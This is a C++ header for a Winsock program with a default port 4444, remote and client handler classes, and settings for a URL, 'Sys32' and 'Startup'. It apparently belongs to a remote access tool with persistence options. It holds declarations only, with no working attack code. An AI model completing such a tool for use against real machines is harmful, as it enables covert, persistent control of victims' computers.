#pragma once
#define DEFAULT_PORT "4444"

#include "Client_Handler.h"



class Initialization
{
public:
	Initialization();
	~Initialization();
	int Initialize(Packet_Handler*, Initialization*);
	static void Static_Listen(Packet_Handler*);
private:



public:
	struct SETTINGS
	{
		int port;
		char URL[256];
		int Sys32;
		int Startup;
	};
	SETTINGS data;
	
	
private:
	WSADATA wsaData;
	
	struct addrinfo *result, *ptr, hints;
	// static void StaticThreadStart(Packet_Handler*);
	

};
static class sInitialization
{
public:
	Client_Handler *_cHandler;
	Remote_Handler* _rHandle = new Remote_Handler();

}sInit;